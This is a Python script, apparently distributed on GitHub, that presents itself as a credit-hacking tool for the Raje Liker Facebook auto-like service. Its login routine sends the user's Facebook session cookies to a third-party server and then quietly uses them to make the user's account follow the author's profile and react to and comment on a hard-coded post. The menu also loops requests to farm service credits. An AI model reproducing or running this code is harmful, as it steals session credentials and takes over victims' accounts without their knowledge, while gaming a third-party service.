#BotolMehedi
#Thanks2RajeLiker

import requests,json,re,random,time,os,sys
from time import sleep
from bs4 import BeautifulSoup as bs
aa="\033[1;91m"
bb="\033[1;92m"
cc="\033[1;93m"
dd="\033[1;94m"
ee="\033[1;95m"
ff="\033[1;96m"
gg="\033[1;97m"
b="\033[1;91m"
c="\033[93m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{g}√{d}]{p}"
er=f"{d}[{r}!{d}]{p}"
pr=f"{d}[{c}?{d}]{p}"
mbasic="https://mbasic.facebook.com{}"


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""
{bb}  ____   ____ _______ ____  _ 
 |  _ \ / __ \__   __/ __ \| |
 | |_) | |  | | | | | |  | | |
 |  _ <| |  | | | | | |  | | |{ff}BABA
{bb} | |_) | |__| | | | | |__| | |____
 |____/ \____/  |_|  \____/|______|                                 
 \n {cc}     IT'S NOT JUST A NAME, IT'S A BRAND
{dd}──────────────────────────────────────────────────
{gg}▸ AUTHOR     : MEHEDI HASAN ARIYAN
▸ FACEBOOK   : FACEBOOK.COM/THEMEHTAN
▸ YOUTUBE    : YOUTUBE.COM/MASTERTRICK1
▸ GITHUB     : GITHUB.COM/BOTOLMEHEDI
{dd}──────────────────────────────────────────────────""")

def agent():
    ua={"user-agent":usa,"version":"8.0.2","accept-encoding":"gzip","packagename":"com.datta.liker","device":"true","host":"rajecreation.com","appname":"Raje Liker","content-type":"application/x-www-form-urlencoded; charset=utf-8","versioncode":"18","id":"QQ3A.200605.002","token":"3075dda32ffbbe88"}
    return ua

def useragent():
    try:
        usr=open("useragent").read()
    except FileNotFoundError:
        usr=input(f"{er}UserAgent \n{pr} {ab}>>> {c}")
    with open("useragent","w") as us:
        us.write(usr)
    return usr
    
###LoginMenu

def login():
    ua=agent()
    try:
        cokie=open("cookies").read()
    except FileNotFoundError:
        cokie=input(f"{er}Cookies \n{pr} {ab}>>> {c}")
    data={"cookie":cokie,"access_token":"","loginType":"FB","refby":"null"}
    req=requests.post("https://rajecreation.com/rajeliker/v8/login.php",data=data,headers=ua).text
    if "Login success!" in req:
       with open("cookies","w") as ck:
            ck.write(data["cookie"])
       try:
           lg=ses.get(mbasic.format("/me"),cookies={"cookie":cokie}).text
           lg=bs(lg,"html.parser").find("form",action=lambda x: "/intl/save_locale/?loc=id_ID" in x)
           dt=lg.find_all("input",type="hidden")
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           ses.post(mbasic.format(lg["action"]),data={"fb_dtsg":fg,"jazoest":jz},cookies={"cookie":cokie})
       except:
           pass
       try:
           flw=ses.get(mbasic.format("/mehedihasanariyan2"),cookies={"cookie":cokie}).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
       except:
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/100009601655445/posts/2380517862278246/",cookies={"cookie":cokie}).text
           react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies={"cookie":cokie})
       except:
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/100009601655445/posts/2380517862278246/",cookies={"cookie":cokie}).text
           komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Nice Post by BRAJE/BOTOLBABA","Just Awesome by BRAJE/BOTOLBABA","Wow by BRAJE/BOTOLBABA","Loved it by BRAJE/BOTOLBABA","Wonderful by BRAJE/BOTOLBABA"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
       except:
           pass
       js=json.loads(req)
       return {"name":js["data"]["name"],"id":js["data"]["myid"],"cookie":js["data"]["cok"]}
    else:
       print(f"{er}Login Failed")
       try:
           os.system("rm cookies")
       except:
           pass
       os.system("python braje.py")
       
       
##Contact

## def contact():
##	print(f"{cc}Email: TheBotolBaba@Gmail.Com")


###EarnPoint

def earn():
    ua=agent()
    data={"user_id":id,"type":"FB","code":cokie}
    req=requests.post("https://rajecreation.com/rajeliker/v8/earn.php",data=data,headers=ua).text
    if "Credit Successfully Added.Check Your RajeLiker Account." in req:
       res=requests.post("https://rajecreation.com/rajeliker/v8/timer.php",data={"user_id":id,"type":"FB"},headers={"user-agent":usa,"content-type":"application/x-www-form-urlencoded; charset=utf-8","accept-encoding":"gzip","host":"rajecreation.com"}).json()
       print(f"\r{dn}Credit : {c}"+str(res["active"]),end="")
       return res["active"]
    else:
       print(f"\r{er}Failed to Earn Credit. Please Try Again Later.")

##UserInfo

def userinfo():
    print(f"{p}Account : {c}{name}")
    print(f"{p}ID      : {c}{id}")
    print(f"{ab}-----------------------------------------------{d}")

###Menu

def menu():
    banner()
    userinfo()
    print(f"""{p}
{c}01{ab}. {p}Hack Credits
{c}02{ab}. {p}Contact Me
{c}00{ab}. {p}Exit
{ab}-----------------------------------------------{d}""")
    main_menu()


##MainMenu

def main_menu():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       banner()
       sys.exit(f"{er}Dont Forget To Star My GitRepo.")
    elif choice == "01" or choice == "1":
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               earn()
               sleep(1)
           except:
               break
       print()
       input(f"{d}[{c} Press Enter To Back {d}]")
       os.system("python braje.py")
    elif choice == "02" or choice == "2":
    	print(f"\n\n{cc}Contact Email: TheBotolBaba@Gmail.Com\n\n\n")
    	input(f"{d}[ {c}Press Enter To Back {d}]")
    	os.system("python braje.py")
    else:
    	print(f"{er}Fill incorrectly")
    main_menu()


if __name__=="__main__":
   banner()
   usa=useragent()
   ses=requests.Session()
   ses.headers.update({"user-agent":usa})
   try:
      enter=login()
      cokie=enter["cookie"]
      id=enter["id"]
      name=enter["name"]
      menu()
   except Exception as e:
      sys.exit(f"{er}{e}")
